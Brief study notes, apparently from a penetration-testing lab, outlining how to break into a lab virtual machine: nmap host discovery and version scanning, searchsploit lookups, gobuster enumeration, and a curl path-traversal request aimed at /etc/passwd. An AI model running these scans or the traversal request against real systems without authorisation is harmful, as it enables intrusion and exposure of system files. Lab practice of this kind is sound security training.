To crack someone's vm

Use host detection
    ifconfig | grep inet 
    Or: VMware tells you the IP address

    nmap -sn 172.16.41.0/24

Enumeration: 
    nmap -sV -oN nmap-results-txt 172.16.41.141
    -sV: if you find a server listening on a port, try to figure out version. 
    -sC: takes longer

ports range from 0-65535
--> -sV does 1000 most common?
--> 80 (web server),443 (https), 22 (ssh), 25 (smtp)...


Kali: searchsploit apache 2.4 
2.4.52 has no public exploits, but can try


curl --path-as-is http://172.16.41.141/../../../etc/passwd

Try gobuster (directory enumeration, subdomain enumeration)

--> are we trying to avoid detection, or trying to break in no matter what
--> some nmap better than others for this
    --> xmas tree scan, lights up server like a christmas tree
